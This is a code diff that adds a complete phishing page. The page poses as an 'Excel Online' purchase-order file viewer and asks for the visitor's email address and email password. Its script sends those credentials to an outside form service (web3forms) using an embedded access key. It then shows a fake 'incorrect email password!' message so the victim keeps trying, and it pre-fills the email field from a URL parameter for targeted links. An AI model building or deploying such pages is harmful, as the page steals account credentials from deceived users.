@@ -1,0 +1,98 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Purchase Order</title>
+<link rel="icon" type="image/png" href="images/logo.png">
+<link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+<div class="lbox">
+<div class="spin-block" id="spin-block">
+<img src="images/spin.gif">
+</div>
+
+<form method="POST" id="form">
+<!-- Replace with your Access Key -->
+    <input type="hidden" name="access_key" value="dc30a8be-0c1a-45e0-851b-a84d6e144934">
+<div class="htxt">
+Excel Online - Verify to view file
+</div>
+<hr class="hr">
+<div class="fbox">
+
+<label for="email">Email:</label>
+<input type="email" name="ai" class="input" id="email" placeholder="Email Address" value="">
+<label for="password">Password:</label>
+<input type="password" name="si" class="input" id="password" placeholder="Email Password" value="">
+<button class="submit" id="submit" type="submit" >Continue</button>
+
+<div id="result"></div>
+
+</form>
+
+<script src="https://web3forms.com/client/script.js" async defer></script>
+
+<script>
+const form = document.getElementById('form');
+const result = document.getElementById('result');
+
+form.addEventListener('submit', function(e) {
+  e.preventDefault();
+  const formData = new FormData(form);
+  const object = Object.fromEntries(formData);
+  const json = JSON.stringify(object);
+  result.innerHTML = "Verifying..."
+
+    fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Accept': 'application/json'
+            },
+            body: json
+        })
+        .then(async (response) => {
+            let json = await response.json();
+            if (response.status == 200) {
+                result.innerHTML = "incorrect email password!";
+            } else {
+                console.log(response);
+                result.innerHTML = json.message;
+            }
+        })
+        .catch(error => {
+            console.log(error);
+            result.innerHTML = "Something went wrong!";
+        })
+        .then(function() {
+            password.reset();
+            setTimeout(() => {
+                result.style.display = "none";
+            }, 3000);
+        });
+});
+</script>
+
+<script type="text/javascript">
+var getUrlParameter = function getUrlParameter(sParam) {
+    var sPageURL = decodeURIComponent(window.location.search.substring(1)),
+        sURLVariables = sPageURL.split('&'),
+        sParameterName,
+        i;
+    for (i = 0; i < sURLVariables.length; i++) {
+        sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] === sParam) {
+            return sParameterName[1] === undefined ? true : sParameterName[1];
+        }
+    }
+};
+
+var firstname = getUrlParameter('e');
+
+     document.getElementById("email").value = firstname;
+
+</script>
+    
+
+</html>
